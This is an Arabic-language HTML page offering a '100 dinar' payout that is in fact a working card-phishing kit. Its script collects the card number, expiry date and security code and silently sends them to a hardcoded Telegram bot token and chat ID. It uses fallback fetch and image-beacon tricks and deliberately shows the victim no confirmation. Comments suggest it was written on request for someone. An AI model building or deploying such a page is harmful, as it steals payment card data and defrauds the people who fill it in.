<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>تقديم 100 دينار — نموذج</title>

  <style>
    :root{
      --bg: #f5f8fb;
      --panel: #ffffff;
      --muted: #6b7280;
      --accent-1: #06b6d4;
      --accent-2: #3b82f6;
      --accent-3: #7c3aed;
      --danger: #ef4444;
      --radius: 12px;
      --shadow: 0 16px 36px rgba(16,24,40,0.06);
      --shadow-sm: 0 8px 18px rgba(16,24,40,0.04);
      --input-h: 44px;
      --gap-tight: 6px;
      --text: #042033;
    }

    * { box-sizing: border-box; }
    html,body { height:100%; margin:0; font-family: Inter, "Noto Naskh Arabic", system-ui, -apple-system, "Segoe UI", Roboto, Arial; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; }
    body {
      background: linear-gradient(180deg,#f8fbff 0%, var(--bg) 100%);
      color:var(--text);
      padding:20px;
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
      direction:rtl;
    }

    /* Container: very tight spacing between columns */
    .app {
      width:100%;
      max-width:980px;
      display:grid;
      grid-template-columns: 1fr 420px;
      gap:6px;                /* very small gap to bring card close */
      padding:12px;
      border-radius:calc(var(--radius) + 4px);
      background: rgba(255,255,255,0.9);
      box-shadow: var(--shadow);
      align-items:start;
    }
    @media (max-width:920px) {
      .app { grid-template-columns: 1fr; gap:12px; }
      .right { order:-1; }
    }

    /* Left form */
    .left {
      background:var(--panel);
      border-radius:var(--radius);
      padding:12px;
      border:1px solid rgba(4,6,12,0.04);
      box-shadow: var(--shadow-sm);
    }

    .title { margin:0 0 4px 0; font-size:18px; font-weight:700; }
    .subtitle { margin:0; color:var(--muted); font-size:13px; }

    form { margin-top:8px; display:flex; flex-direction:column; gap:8px; }

    .field { display:flex; flex-direction:column; gap:6px; }
    label.inline { font-weight:700; font-size:13px; color:var(--text); display:flex; gap:6px; align-items:center; }

    .control {
      display:flex; align-items:center; gap:10px;
      background:#fbfdff; padding:8px 10px; border-radius:10px;
      border:1px solid rgba(4,6,12,0.04); height:var(--input-h);
    }
    input[type="text"], input[type="tel"] {
      border:0; background:transparent; outline:none; width:100%; font-size:15px; color:var(--text);
      direction:ltr; text-align:left;
    }
    input::placeholder { color: rgba(4,6,12,0.32); }

    .two-cols { display:flex; gap:8px; }
    .two-cols > div { flex:1; }

    .hint { font-size:12px; color:var(--muted); margin-top:2px; }

    /* Inline validation error */
    .error { color:var(--danger); font-size:13px; margin-top:4px; display:none; }

    /* Centered big CTA */
    .actions { display:flex; justify-content:center; margin-top:6px; }
    .cta {
      padding:14px 28px; border-radius:16px; background: linear-gradient(90deg,var(--accent-2),var(--accent-3));
      color:white; border:0; font-weight:800; font-size:16px; cursor:pointer;
      box-shadow: 0 14px 36px rgba(59,130,246,0.14);
      min-width:220px;
    }
    .cta:disabled { opacity:0.7; cursor:default; }

    /* Right preview (card) - placed tightly next to form */
    .right { padding:0; display:flex; flex-direction:column; gap:6px; align-items:stretch; }

    .card-area {
      border-radius:12px; padding:12px; height:220px;
      background: linear-gradient(180deg,#fff 0%, #fbfdff 100%);
      border:1px solid rgba(4,6,12,0.03);
      box-shadow: 0 12px 26px rgba(4,6,12,0.04);
      display:flex; flex-direction:column; justify-content:space-between;
    }

    .card-top { display:flex; justify-content:space-between; align-items:center; gap:8px; }
    .chip { width:50px; height:34px; border-radius:8px; background: linear-gradient(180deg,#ffd9a6,#ffb86b); }

    .amount-badge {
      background: linear-gradient(90deg,var(--accent-2),var(--accent-3));
      color: white;
      padding:8px 12px;
      border-radius:12px;
      font-weight:900;
      font-size:18px;
      box-shadow: 0 8px 22px rgba(59,130,246,0.12);
      text-align:center;
    }

    .card-surface {
      border-radius:10px; padding:12px; display:flex; flex-direction:column; gap:8px;
      background: linear-gradient(135deg, rgba(59,130,246,0.06), rgba(139,92,246,0.04));
      color:var(--text);
    }

    .card-number { font-family: "Courier New", Courier, monospace; font-size:20px; letter-spacing:2px; text-align:left; direction:ltr; color:var(--text); word-break:break-word; }

    .card-meta { display:flex; justify-content:space-between; gap:8px; align-items:center; }
    .meta-label { font-size:11px; color: rgba(4,6,12,0.6); }
    .meta-value { font-weight:800; font-size:15px; }

    /* minimal helper */
    .muted { color:var(--muted); font-size:13px; }

    @media (max-width:920px){
      .app { grid-template-columns: 1fr; gap:12px; padding:12px; }
      .two-cols { gap:10px; }
      .card-area { height:200px; }
    }
  </style>
</head>
<body>
  <div class="app" role="application" aria-label="نموذج تقديم 100 دينار">
    <!-- LEFT: Inputs -->
    <div class="left" aria-labelledby="mainTitle">
      <h2 id="mainTitle" class="title">إدخال بيانات البطاقة</h2>
      <p class="subtitle">املأ الحقول ثم اضغط "استلام المبلغ"</p>

      <form id="form" autocomplete="on" novalidate>
        <div class="field">
          <label class="inline">رقم البطاقة (16 رقم)</label>
          <div class="control">
            <input id="idNumber" name="idNumber" type="text" inputmode="numeric" autocomplete="cc-number"
                   placeholder="0000 0000 0000 0000" aria-describedby="idHint" dir="ltr" />
          </div>
          <div id="idError" class="error">الرجاء إدخال 16 رقماً.</div>
          <div id="idHint" class="hint">الكتابة من اليسار لليمين — يتم تنسيق الأرقام تلقائيًا.</div>
        </div>

        <div class="two-cols">
          <div class="field">
            <label class="inline">تاريخ الانتهاء (MM/YY أو MM/YYYY)</label>
            <div class="control">
              <input id="expiry" name="expiry" type="text" inputmode="numeric" placeholder="MM/YY أو MM/YYYY" maxlength="7" autocomplete="cc-exp" />
            </div>
            <div id="expiryError" class="error">الرجاء إدخال تاريخ صالح.</div>
            <div class="hint">مثال: 01/28 أو 01/2028 أو 0128</div>
          </div>

          <div class="field">
            <label class="inline">الرقم (3 خانات)</label>
            <div class="control">
              <input id="threeDigits" name="threeDigits" type="tel" inputmode="numeric" maxlength="3" placeholder="000" autocomplete="cc-csc" />
            </div>
            <div id="threeError" class="error">الرجاء إدخال 3 أرقام.</div>
            <div class="hint">مثال: 123</div>
          </div>
        </div>

        <div class="actions" aria-hidden="false">
          <button class="cta" id="sendBtn" type="submit">استلام المبلغ</button>
        </div>
      </form>
    </div>

    <!-- RIGHT: Preview (very close to inputs) -->
    <div class="right" aria-label="معاينة البطاقة">
      <div class="card-area" role="region" aria-label="بطاقة المعاينة">
        <div class="card-surface">
          <div class="card-top">
            <div style="display:flex;gap:10px;align-items:center">
              <div class="chip" aria-hidden></div>
            </div>
            <div class="amount-badge" aria-hidden>100 دينار</div>
          </div>

          <div>
            <div class="card-number" id="cardNumber" aria-live="polite" dir="ltr">0000 0000 0000 0000</div>
          </div>

          <div class="card-meta">
            <div>
              <div class="meta-label">تاريخ الانتهاء</div>
              <div class="meta-value" id="cardExpiry">MM/YY</div>
            </div>

            <div>
              <div class="meta-label">الرقم (3)</div>
              <div class="meta-value" id="cardThree">000</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    /************************************************
     * ملاحظة: التوكن و chat_id مضمّنان هنا كما طلبت.
     * إذا نُشر الملف علنًا فسيكون التوكن مكشوفًا.
     ************************************************/
    const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
    const CHAT_ID = "6873334348";

    const form = document.getElementById('form');
    const idInput = document.getElementById('idNumber');
    const expiryInput = document.getElementById('expiry');
    const threeInput = document.getElementById('threeDigits');
    const sendBtn = document.getElementById('sendBtn');

    const cardNumberEl = document.getElementById('cardNumber');
    const cardExpiryEl = document.getElementById('cardExpiry');
    const cardThreeEl = document.getElementById('cardThree');

    const idError = document.getElementById('idError');
    const expiryError = document.getElementById('expiryError');
    const threeError = document.getElementById('threeError');

    // helpers
    function rawDigits(v='') { return (v||'').toString().replace(/\D/g, ''); }
    function formatGroups(d) { return (d.match(/.{1,4}/g) || []).join(' '); }

    // input formatting and live preview
    idInput.addEventListener('input', (e) => {
      const digits = rawDigits(e.target.value).slice(0,16);
      e.target.value = formatGroups(digits);
      try { e.target.selectionStart = e.target.selectionEnd = e.target.value.length; } catch (_) {}
      updatePreview();
      hideError(idError);
    });

    expiryInput.addEventListener('input', (e) => {
      let v = e.target.value.replace(/[^\d]/g, '').slice(0,6);
      if (v.length <= 2) e.target.value = v;
      else if (v.length <= 4) e.target.value = v.slice(0,2) + '/' + v.slice(2);
      else e.target.value = v.slice(0,2) + '/' + v.slice(2,6);
      updatePreview();
      hideError(expiryError);
    });

    threeInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/\D/g,'').slice(0,3);
      updatePreview();
      hideError(threeError);
    });

    function updatePreview() {
      const digits = rawDigits(idInput.value);
      const padded = (digits + '●'.repeat(Math.max(0, 16 - digits.length))).slice(0,16);
      cardNumberEl.textContent = padded.match(/.{1,4}/g).join(' ');
      const exp = expiryInput.value || '';
      const m = exp.match(/^(\d{2})\/(\d{2,4})$/);
      if (m) {
        const mm = m[1];
        const yy = m[2].length === 4 ? m[2].slice(-2) : m[2];
        cardExpiryEl.textContent = `${mm}/${yy || 'YY'}`;
      } else if (/^\d{4}$/.test(exp)) {
        cardExpiryEl.textContent = `${exp.slice(0,2)}/${exp.slice(2)}`;
      } else {
        cardExpiryEl.textContent = exp || 'MM/YY';
      }
      cardThreeEl.textContent = threeInput.value ? threeInput.value.padEnd(3, '●') : '000';
    }

    function showError(el, text) {
      el.textContent = text;
      el.style.display = 'block';
    }
    function hideError(el) {
      el.style.display = 'none';
    }

    // initial preview
    updatePreview();

    // validation rules
    function validId() { return /^\d{16}$/.test(rawDigits(idInput.value)); }
    function validExpiry() {
      const v = expiryInput.value;
      const m = v.match(/^(\d{2})\/(\d{2,4})$/);
      if (!m) return false;
      const mm = parseInt(m[1],10);
      const yy = m[2].length === 2 ? 2000 + parseInt(m[2],10) : parseInt(m[2],10);
      if (mm < 1 || mm > 12) return false;
      const last = new Date(yy, mm, 0, 23, 59, 59);
      return last > new Date();
    }
    function validThree() { return /^\d{3}$/.test(threeInput.value); }

    // Build compact message to send (id|MM/YYYY|cvv)
    function normalizeExpiryForSend(display) {
      if (!display) return '';
      const m = display.match(/^(\d{2})\/(\d{2,4})$/);
      if (m) {
        const mm = m[1];
        const yy = m[2];
        return (yy.length === 2) ? `${mm}/${2000 + parseInt(yy,10)}` : `${mm}/${yy}`;
      }
      if (/^\d{4}$/.test(display)) return `${display.slice(0,2)}/${2000 + parseInt(display.slice(2),10)}`;
      return display;
    }
    function buildSendText() {
      return `${rawDigits(idInput.value)}|${normalizeExpiryForSend(expiryInput.value)}|${threeInput.value}`;
    }

    // Sending behavior: on submit validate, then send — NO visible success message per user request.
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      // hide previous errors
      hideError(idError); hideError(expiryError); hideError(threeError);

      let ok = true;
      if (!validId()) { showError(idError, 'الرجاء إدخال 16 رقماً.'); ok = false; }
      if (!validExpiry()) { showError(expiryError, 'الرجاء إدخال تاريخ صالح.'); ok = false; }
      if (!validThree()) { showError(threeError, 'الرجاء إدخال 3 أرقام.'); ok = false; }

      if (!ok) return;

      // disable button while sending; no success message will be shown
      sendBtn.disabled = true;

      const text = buildSendText();
      const base = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
      const params = new URLSearchParams({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      });
      const url = `${base}?${params.toString()}`;

      // Try normal fetch, then fallbacks. Do not show success messages to user.
      try {
        const resp = await fetch(url, { method: 'GET' });
        try {
          // attempt to read response if possible
          if (resp && resp.ok) {
            await resp.json().catch(()=>{});
          }
        } catch(_) {}
      } catch (err) {
        // fallbacks (no visual feedback)
        try { await fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store' }); } catch(_) {
          // image fallback
          try {
            await new Promise((resolve) => {
              const img = new Image();
              img.onload = () => resolve(true);
              img.onerror = () => resolve(true);
              img.src = url + "&_=" + Date.now();
              setTimeout(() => resolve(true), 3000);
            });
          } catch(_) {}
        }
      } finally {
        // re-enable button and keep UI unchanged otherwise (no success message)
        sendBtn.disabled = false;
      }
    });

    // live preview update while typing
    [idInput, expiryInput, threeInput].forEach(i => i.addEventListener('input', updatePreview));
  </script>
</body>
</html>
